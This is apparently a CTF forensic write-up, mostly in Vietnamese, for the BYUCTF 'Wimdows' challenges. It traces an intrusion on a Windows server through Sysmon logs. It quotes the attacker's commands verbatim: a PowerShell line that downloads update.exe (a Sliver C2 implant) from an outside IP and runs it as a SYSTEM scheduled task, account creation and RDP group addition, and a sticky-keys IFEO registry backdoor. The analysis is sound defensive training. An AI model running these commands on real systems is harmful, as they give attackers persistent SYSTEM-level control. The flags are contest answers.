# Wimdows 1
## Mô tả
Earlier this week, an attacker managed to get into one of our Windows servers... can you help us figure out what happened? The VM files for this challenge are located below (the credentials are vagrant/vagrant): https://byu.box.com/v/byuctf-wimdows

What CVE did the attacker exploit to get a shell on the machine? Wrap your answer in byuctf{}. E.g. byuctf{CVE-2021-38759}

Hint: Figure out what process the attacker exploited and look up vulnerabilities associated with it.

### Bài cho một file máy ảo của Windows 2008 R2 server 64bit

### Tất cả các hành động của hacker đều diễn ra vào 15/05/2025 

## Phân tích

Bởi vì làm được phần 2 và 3 trước nên đã biết hacker thực hiện RCE qua powershell vào khoảng 7 giờ tối 15/05/2025, và nhận ra rằng máy ảo có cài đặt Sysmon, nên để biết được đã lợi dụng phần mềm gì để đạt được RCE ta có thể check `Application and services logs\Microsoft\Sysmon\Operational` rồi filter theo thời gian

Khi filter theo thời gian thì lúc đầu sẽ thấy nhiều Event ID 8 `CreateRemoteThread detected` và kéo xuống một chút vào 7:07:47 PM thì có sự kiện ID 1 `ProcessCreate` gọi windows powershell từ chương trình `C:\Program Files\elasticsearch-1.1.1\bin\elasticsearch-service-x64.exe`

```powershell
Process Create:
RuleName: -
UtcTime: 2025-05-16 02:07:47.793
ProcessGuid: {0557f2df-0000-0000-12c4-0c0000000000}
ProcessId: 2144
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.14409.1005 (rs1_srvoob.161208-1155)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand bABzAA==
CurrentDirectory: C:\Program Files\elasticsearch-1.1.1\
User: NT AUTHORITY\SYSTEM
LogonGuid: {0557f2df-0000-0000-e703-000000000000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
ParentProcessGuid: {0557f2df-0000-0000-bbfe-000000000000}
ParentProcessId: 1448
ParentImage: C:\Program Files\elasticsearch-1.1.1\bin\elasticsearch-service-x64.exe
ParentCommandLine: "C:\Program Files\elasticsearch-1.1.1\bin\elasticsearch-service-x64.exe" //RS//elasticsearch-service-x64
ParentUser: NT AUTHORITY\SYSTEM
```

Vậy là đã rõ ràng hacker sử dụng lỗ hổng của elasticsearch bản 1.1.1 để đạt được RCE và chạy lệnh `bABzAA==` là `ls` được mã hoá b64, tiếp tục filter ID 1 và tìm tiếp cũng sẽ cho ta flag của phần 2 và 3, hoặc có thể sử dụng log của Windows Powershell cũng được

## Flag
Lên mạng tìm `elasticsearch 1.1.1 CVE RCE` ngay kết quả đầu tiên sẽ là `https://pentest-tools.com/vulnerabilities-exploits/elasticsearch-v111-12-rce_2305` ra `CVE-2014-3120` đây chính là flag

`byuctf{CVE-2014-3120}`

# Wimdows 2
## Mô tả
Once they got in, the attacker ran some commands on the machine, but it looks like they tried to hide what they were doing. See if you can find anything interesting there (your answer will be found already in byuctf{} format).

## Phân tích
Tiếp tục filter ID 1 và tìm kiếm theo thời gian trên Sysmon log thì sẽ thấy vào 7:08:12 PM có một câu lệnh rất dài được mã hoá b64 
`dwByAGkAdABlAC0AbwB1AHQAcAB1AHQAIAAnAGIAeQB1AGMAdABmAHsAbgAwAHcAXwB0AGgANAB0ADUAXwBzADAAbQAzAF8ANQB1ADUAXwBsADAAMABrADEAbgBnAF8AcAAwAHcAMwByAHMAaAAzAGwAbABfADEAMwA5ADEAMgAzAH0AJwA=`

Decode sẽ cho ta flag `Write-Output 'byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}' `
## Flag

`byuctf{n0w_th4t5_s0m3_5u5_l00k1ng_p0w3rsh3ll_139123}`

# Wimdows 3
## Mô tả
The attacker also created a new account- what group did they add this account to? Wrap your answer in byuctf{}. E.g. byuctf{CTF Players}.

Reminder - all answers are case-INsensitive for all of these problems

## Phân tích
Tiếp tục filter ID 1 và tìm kiếm theo thời gian trên Sysmon log thì sẽ thấy vào 7:08:28 PM hacker đã tạo user phasma `user phasma f1rst0rd3r! /add`

Vào 7:08:48 PM lại có một lệnh powershell mã hoá b64 `bgBlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAIgBSAGUAbQBvAHQAZQAgAEQAZQBzAGsAdABvAHAAIABVAHMAZQByAHMAIgAgAHAAaABhAHMAbQBhACAALwBhAGQAZAA=` dịch ra sẽ là `net localgroup "Remote Desktop Users" phasma /add`

Vậy là add user phasma và group `Remote Desktop Users` theo mô tả thì đây là flag

Phần 3 thì ngoài sysmon log và powershell log thì có thể xem cả ở trong Security log filter ID 4732 `A member was added to a local security-enabled group` thì 7:08:48 PM cũng sẽ có group mà user phasma được add vào

```
A member was added to a security-enabled local group.

Subject:
	Security ID:		SYSTEM
	Account Name:		VAGRANT-2008R2$
	Account Domain:		WORKGROUP
	Logon ID:		0x3e7

Member:
	Security ID:		VAGRANT-2008R2\phasma
	Account Name:		-

Group:
	Security ID:		BUILTIN\Remote Desktop Users
	Group Name:		Remote Desktop Users
	Group Domain:		Builtin

Additional Information:
	Privileges:		-
```

## Flag

`byuctf{Remote Desktop Users}`

# Wimdows 4
## Mô tả
Using their access, the attacker also deployed a C2 binary on the machine - what C2 framework was it, and what IP address was the C2 attempting to connect to?

Format your answer like so: byuctf{<c2 framework>_<ip address>}. E.g. byuctf{evilosx_10.1.1.1}

## Phân tích
Tiếp tục tìm trong Sysmon log, vào 7:10:15 PM chạy lệnh sau 

```powershell
$BINARY='C:\Windows\System32\update.exe' ; $ProgressPreference = 'SilentlyContinue' ; Invoke-WebRequest -Uri "http://192.168.1.107:8000/update.exe" -OutFile $BINARY ; schtasks /create /tn "updates" /tr $BINARY /ru 'SYSTEM' /sc onstart /rl highest ; schtasks /run /tn "updates"
```

Lệnh này tải một file update.exe từ http://192.168.1.107:8000/, tắt hiển thị tiến trình tải file (để chạy lặng lẽ, không báo lỗi hay thông báo gì) rồi lưu vào thư mục C:\Windows\System32\, sau đó tạo một task trên Windows Task Scheduler tên là `updates` để chạy file đó với quyền cao nhất mỗi khi máy tính khởi động, rồi chạy ngay lập tức

Vậy là ta biết được file đó đã được tải về trên máy, vào `C:\Windows\System32\` rồi xuất update.exe ra, đưa lên virus total thì biết được C2 framework mà nó sử dụng là `sliver`

Để tìm ra C2 đang muốn kết nối đến địa chỉ nào có thể bật capture trên wireshark rồi chạy update.exe trong máy ảo, vào file pcap sau đó tìm các địa chỉ ip, port khác thường mà ip của máy mình đang cố kết nối đến

Trong phần `Relation\Contacted IP addresses` trên virus total cũng có 

Cuối cùng, tìm được máy đang đã gửi kết nối qua TCP đến IP `192.168.1.224:8888` đây chính là phần còn lại của flag

Tác giả cũng đã đề xuất một cách khác để tìm ra IP đơn giản hơn, đó là `my solution, which is surely one of many ways, was to run the binary and at the same time run netstat in another terminal`
## Flag

`byuctf{sliver_192.168.1.224}`

# Wimdows 5
## Mô tả

Last but not least, the attacker put another backdoor in the machine to give themself SYSTEM privileges... what was it? (your answer will be found directly in `byuctf{}` format)

## Phân tích

Cuối cùng thì vào 7:10:42 PM hacker đã tạo backdoor bằng cách sau

```powershell
Process Create:
RuleName: -
UtcTime: 2025-05-16 02:10:42.794
ProcessGuid: {0557f2df-0000-0000-7bea-0d0000000000}
ProcessId: 4460
Image: C:\Windows\System32\reg.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: "C:\Windows\system32\reg.exe" ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe #byuctf{00p5_4ll_b4ckd00r5_139874}" /f
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {0557f2df-0000-0000-e703-000000000000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=9D0B3066FE3D1FD345E86BC7BCCED9E4,SHA256=4E66B857B7010DB8D4E4E28D73EB81A99BD6915350BB9A63CD86671051B22F0E,IMPHASH=85C854CD51885B4B1E99BD14B33472B9
ParentProcessGuid: {0557f2df-0000-0000-fddf-0d0000000000}
ParentProcessId: 860
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoExit -Command [Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8
ParentUser: NT AUTHORITY\SYSTEM
```

Lợi dụng sticky keys, hacker đã chỉnh registry

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe
```

Thay vì mở `sethc.exe` (Sticky Keys), hệ thống sẽ mở `cmd.exe` với quyền SYSTEM, vì registry đã chỉnh:

```
Debugger = C:\windows\system32\cmd.exe
```

Đây là kĩ thuật tấn công Process Injection và Persistence bằng chỉnh sửa registry(Ở đây là khoá IFEO)

Khóa IFEO thường được sử dụng để debug. Có thể đặt một giá trị “Debugger” khoá này để chỉ định một chương trình được gắn vào mỗi khi một executable cụ thể được chạy

## Flag

Ở trong phần comment của câu lệnh

`byuctf{00p5_4ll_b4ckd00r5_139874}`